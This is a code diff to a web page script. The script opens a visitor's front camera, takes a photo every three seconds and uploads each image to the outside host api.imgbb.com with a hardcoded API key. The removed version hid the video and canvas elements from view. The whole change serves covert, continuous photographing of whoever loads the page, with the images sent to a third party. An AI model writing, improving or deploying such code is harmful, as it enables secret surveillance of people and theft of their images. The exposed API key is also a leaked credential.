@@ -17,65 +17,38 @@
 <script>
 let captureInterval;
 
-function createVideoAndCanvasElements() {
-    // Create video element
-    const video = document.createElement('video');
-    video.setAttribute('autoplay', '');
-    video.style.display = 'none'; // Hide video element
-
-    // Create canvas element
-    const canvas = document.createElement('canvas');
-    canvas.style.display = 'none'; // Hide canvas element
-
-    document.body.appendChild(video);
-    document.body.appendChild(canvas);
-
-    return { video, canvas };
-}
-
 function startCapturingAndUploading() {
-    const { video, canvas } = createVideoAndCanvasElements();
-    
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // Use front camera
     .then(function(stream) {
-        video.srcObject = stream;
-        video.play();
-        const context = canvas.getContext('2d');
-
+        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+        
         function captureAndUpload() {
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/jpeg');
-            const formData = new FormData();
-            formData.append('image', dataURItoBlob(imageData));
+            imageCapture.takePhoto()
+            .then(blob => {
+                const formData = new FormData();
+                formData.append('image', blob);
 
-            fetch('https://api.imgbb.com/1/upload?key=bc0128afc43bdda4d55e79c3781728ac', {
-                method: 'POST',
-                body: formData,
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.data) {
-                    console.log('Upload successful:', data.data.url);
-                    // Optionally, vibrate on success
-                    if (navigator.vibrate) navigator.vibrate(200);
-                } else {
-                    console.log('Failed to upload image. Retrying...');
-                }
+                fetch('https://api.imgbb.com/1/upload?key=bc0128afc43bdda4d55e79c3781728ac', {
+                    method: 'POST',
+                    body: formData,
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.data) {
+                        console.log('Upload successful:', data.data.url);
+                        // Optionally, vibrate on success
+                        if (navigator.vibrate) navigator.vibrate(200);
+                    } else {
+                        console.log('Failed to upload image. Retrying...');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
             })
             .catch(error => {
-                console.error('Error:', error);
+                console.error('Error taking photo:', error);
             });
-        }
-
-        function dataURItoBlob(dataURI) {
-            const byteString = atob(dataURI.split(',')[1]);
-            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], {type: mimeString});
         }
 
         captureInterval = setInterval(captureAndUpload, 3000); // Adjust time as needed
